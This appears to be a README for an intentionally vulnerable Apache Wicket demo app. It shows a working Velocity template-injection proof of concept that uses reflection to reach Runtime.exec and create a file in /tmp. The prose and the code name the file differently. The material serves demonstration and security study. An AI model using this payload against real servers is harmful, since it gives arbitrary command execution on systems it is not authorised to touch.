## vuln-velocity-wicket ##

You can start vulnerable wicket project on cli:

```
mvn clean install 
java -jar target/dependency/jetty-runner.jar target/*.war
```

1. Visit local URL http://127.0.0.1:8080/
2. Paste velocity exploit code into wicket veloctiy editor.
3. Press update button.
4. Velocity expoit creates a new file velocity-poc.txt in /tmp
```
#set($start = "")
#set($classLoaderMethod =$start.getClass().getClass().getDeclaredMethod("getClassLoader", null))
$classLoaderMethod.setAccessible(true)
#set($appClassLoader=$classLoaderMethod.invoke(${persons.get(0).getClass()},null))


#set($runtTimeClass = $appClassLoader.loadClass("java.lang.Runtime"))
#set($runtimedMethod = $runtTimeClass.getDeclaredMethod("getRuntime", null))
#set($runtimedMethodExecuted = $runtimedMethod.invoke($runtTimeClass, null))
#set($stringClass = $appClassLoader.loadClass("java.lang.String"))
$runtimedMethodExecuted.getClass().getDeclaredMethod("exec", $stringClass).invoke($runtimedMethodExecuted, "touch /tmp/velocity-rce-poc.txt")
```

